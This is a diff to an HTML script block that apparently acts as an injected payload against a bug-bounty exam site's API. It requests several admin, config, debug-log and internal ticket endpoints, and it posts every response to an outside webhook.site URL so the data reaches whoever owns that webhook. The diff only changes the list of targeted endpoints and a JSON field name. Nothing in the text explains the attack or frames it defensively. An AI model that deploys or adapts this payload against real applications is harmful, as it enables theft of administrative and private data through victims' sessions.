@@ -4,15 +4,15 @@
     <script>
         const webh = "https://webhook.site/6b0b4772-6bdc-417e-a83a-2403f5690ef1";
         const base = "https://api-bugbounty-exam.hashacademy.co";
+        const msgId = "69ea4654bee6d6b7c66459ca";
 
-        // These are the "High Value" targets discovered in previous research
+        // Testing the most probable "unversioned" and admin-only endpoints
         const targets = [
-            "/api/v1/admin/logs",
-            "/api/admin/config",
-            "/api/admin/stats",
-            "/api/system/health",
-            "/api/logs/debug",
-            "/api/admin/system/env"
+            "/api/admin/logs",          // Standard path
+            "/api/admin/stats",         // Dashboard data
+            "/api/system/config",       // Internal settings
+            "/api/logs/debug",          // Debugging output
+            `/api/contact/messages/${msgId}` // The "internal" view of your ticket
         ];
 
         targets.forEach(path => {
@@ -24,7 +24,7 @@
             .then(data => {
                 fetch(webh, {
                     method: "POST",
-                    body: JSON.stringify({ path: path, content: data })
+                    body: JSON.stringify({ path: path, data: data })
                 });
             }).catch(e => {});
         });
